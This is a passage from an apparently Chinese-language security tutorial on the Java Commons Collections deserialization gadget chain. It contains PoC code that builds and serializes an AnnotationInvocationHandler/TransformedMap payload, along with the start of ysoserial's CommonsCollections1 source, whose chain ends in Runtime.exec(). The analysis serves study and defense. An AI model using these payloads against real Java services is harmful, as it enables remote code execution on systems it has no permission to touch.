&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>仅有demo的代码不足以构造完全可用的poc，实际的反序列化中，不同于手工执行outerMap.put()，我们离不开一个合适的&lt;code>readObject&lt;/code>触发&lt;code>outerMap.put&lt;/code>-&amp;gt;&lt;code>transform&lt;/code>&lt;/p>
&lt;p>这里用到的是&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>，看一下它的&lt;code>readObject&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AnnotationType&lt;/span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">AnnotationType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalArgumentException&lt;/span> &lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Non-annotation type in annotation serial stream&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberTypes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Iterator&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberValues&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">entrySet&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!(&lt;/span>&lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">ExceptionProxy&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AnnotationTypeMismatchExceptionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setMember&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Method&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">members&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码比较好看懂，先是得到前面传入的Map（我们传入经过TransformedMap修饰的对象），之后依次遍历，到了&lt;code>setValue&lt;/code>时会触发transform的回调&lt;/p>
&lt;p>所以我们构造POC时需要创建&lt;code>AnnotationInvocationHandler&lt;/code>对象，并把前面的&lt;code>HashMap&lt;/code>传进来作为Map参数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同时因为AnnotationInvocationHandler是内部类不能直接new，我们用反射+setAccessible(true)的方式实例化；并且由于&lt;code>Runtime.getRuntime&lt;/code>没有实现序列化的接口，所以我们用反射获取当前上下文的Runtime对象&lt;/p>
&lt;p>另外，为了满足readObject中的&lt;code>var7!=null&lt;/code>的判断，要满足&lt;/p>
&lt;ul>
&lt;li>&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>构造函数的第一个参数为Annotation的子类，且必须至少含有一个方法，假设方法名为X&lt;/li>
&lt;li>被&lt;code>TransformedMap.decorate&lt;/code>修饰的Map中必有一个键名为X的元素&lt;/li>
&lt;/ul>
&lt;p>8u71之后的版本修改了&lt;code>AnnotationInvocationHandler&lt;/code>的readObject函数，不再使用反序列化得到的Map对象，而是新建了LinkedHashMap对象，把原来的key-value添加进去，所以后续对Map的操作都是基于这个&lt;code>LinkedHashMap&lt;/code>对象，不会再触发set或put了&lt;/p>
&lt;p>最后把对象生成序列化流&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="lazymap">LazyMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Authors&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Dependencies&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.PayloadTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Gadgets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.JavaVersion&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.PayloadRunner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Reflections&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Map(Proxy).entrySet()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ConstantTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Class.getMethod()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.getRuntime()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Requires:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> commons-collections
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@PayloadTest&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">precondition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;isApplicableJavaVersion&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Dependencies&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;commons-collections:commons-collections:3.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Authors&lt;/span>&lt;span style="color:#f92672">({&lt;/span> &lt;span style="color:#111">Authors&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FROHOFF&lt;/span> &lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections1&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">PayloadRunner&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
